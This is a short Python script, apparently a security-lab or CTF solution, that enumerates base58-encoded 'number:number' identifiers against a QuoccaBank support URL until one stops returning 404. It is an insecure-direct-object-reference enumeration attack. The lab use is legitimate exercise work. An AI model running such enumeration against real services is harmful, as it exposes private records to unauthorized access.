import requests
import base58
import time

string = ""

for i in range(1120, 1200):
    for j in range(50):
        string = str(i)+':'+str(j)
        encoded = str(base58.b58encode(string))
        cleaned = encoded[1:]
        cleaned = cleaned.replace("'", "")
        time.sleep(0.1)
        x = requests.get('https://support.quoccabank.com/raw/'+cleaned)
        print(string, x.status_code)
        if x.status_code != 404:
            break
        